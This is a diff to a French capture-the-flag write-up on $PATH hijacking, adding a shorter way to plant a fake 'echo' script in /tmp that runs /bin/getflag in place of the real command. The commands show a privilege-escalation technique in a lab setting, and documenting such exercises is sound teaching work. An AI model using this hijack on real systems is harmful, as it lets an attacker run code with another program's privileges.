@@ -12,7 +12,10 @@ Cette faille repose sur la redéfinition de la variable d’environnement `$PATH
 echo -e '#!/bin/sh\n/bin/getflag' > /tmp/echo
 chmod +x /tmp/echo
 ```
-
+on peut aussi simplement faire :
+```bash
+echo "/bin/getflag" > /tmp/echo
+```
 > Ce script exécute simplement `getflag` à la place de `echo`.
 
 ### Étape 2 : Modifier le `$PATH`
